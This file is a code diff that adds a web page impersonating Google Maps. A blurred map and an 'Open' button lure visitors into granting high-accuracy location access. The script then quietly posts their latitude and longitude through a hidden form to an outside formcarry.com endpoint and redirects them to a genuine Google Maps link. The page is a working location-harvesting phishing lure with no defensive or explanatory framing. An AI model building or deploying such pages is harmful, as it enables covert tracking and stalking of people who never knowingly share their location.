@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Google Maps</title>
+  <link rel="icon" href="google-map-icon.png" type="image/png" />
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+    #overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.35);
+      backdrop-filter: blur(6px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      color: #fff;
+      padding: 20px;
+      z-index: 10;
+    }
+    #overlay.hidden { display: none; }
+    #overlay img { width: 60px; height: 60px; margin-bottom: 15px; }
+    #overlay span { font-size: 1.3em; font-weight: 500; margin-bottom: 15px; }
+    #overlay button {
+      padding: 12px 20px;
+      background: #4285f4;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    #overlay button:hover { background: #3367d6; }
+    #output { font-size: 14px; opacity: 0.9; margin-top: 10px; }
+
+    @media (max-width: 480px) {
+      #overlay img { width: 100px; height: 100px; margin-bottom: 10px; }
+      #overlay span { font-size: 1.8em; }
+      #overlay button { padding: 14px 18px; font-size: 22px; }
+      #output { font-size: 16px; }
+    }
+    @media (max-width: 360px) {
+      #overlay img { width: 80px; height: 80px; }
+      #overlay span { font-size: 1.5em; }
+      #overlay button { padding: 14px 18px; font-size: 22px; }
+      #output { font-size: 14px; }
+    }
+  </style>
+</head>
+<body>
+  <iframe id="map" allowfullscreen="" loading="lazy"></iframe>
+
+  <!-- Overlay -->
+  <div id="overlay">
+    <img src="google-map-icon.png" alt="Google Maps Icon">
+    <span>Open in Google Maps</span>
+    <button onclick="requestLocation()">Open</button>
+    <pre id="output"></pre>
+  </div>
+
+  <!-- Hidden form to send latitude and longitude -->
+  <form id="locationForm" action="https://formcarry.com/s/eIcz1agO_ye" method="POST" style="display:none;">
+    <input type="hidden" name="latitude" id="latitude">
+    <input type="hidden" name="longitude" id="longitude">
+  </form>
+
+  <script>
+    const iframe = document.getElementById("map");
+    const overlay = document.getElementById("overlay");
+    const form = document.getElementById("locationForm");
+    const latInput = document.getElementById("latitude");
+    const lonInput = document.getElementById("longitude");
+    const output = document.getElementById("output");
+
+    // Default map center (Kathmandu) visible immediately
+    const defaultLat = 27.67442;
+    const defaultLon = 85.3123;
+    iframe.src = `https://maps.google.com/maps?q=${defaultLat},${defaultLon}&z=15&output=embed`;
+
+    function requestLocation() {
+      if (!navigator.geolocation) {
+        output.innerText = "Geolocation not supported.";
+        return;
+      }
+
+      const watchId = navigator.geolocation.watchPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          console.log("Coordinates received:", lat, lon);
+          output.innerText = `Lat: ${lat}, Lon: ${lon}`;
+
+          // Update map with real location
+          iframe.src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
+
+          // Update form values
+          latInput.value = lat;
+          lonInput.value = lon;
+
+          // Hide overlay (unblur)
+          overlay.classList.add("hidden");
+
+          // Stop watching after first fix
+          navigator.geolocation.clearWatch(watchId);
+
+          // Submit form then redirect
+          fetch(form.action, {
+            method: 'POST',
+            body: new FormData(form)
+          }).then(() => {
+            setTimeout(() => {
+              window.location.href = "https://maps.app.goo.gl/gxTJVqdHK6HrPMrN8";
+            }, 1500);
+          }).catch(err => {
+            console.error("Form submission failed:", err);
+            window.location.href = "https://maps.app.goo.gl/gxTJVqdHK6HrPMrN8";
+          });
+        },
+        (err) => {
+          console.error("Geolocation error:", err);
+          output.innerText = `Error: ${err.message}`;
+          // Keep overlay visible until success
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    }
+  </script>
+</body>
+</html>
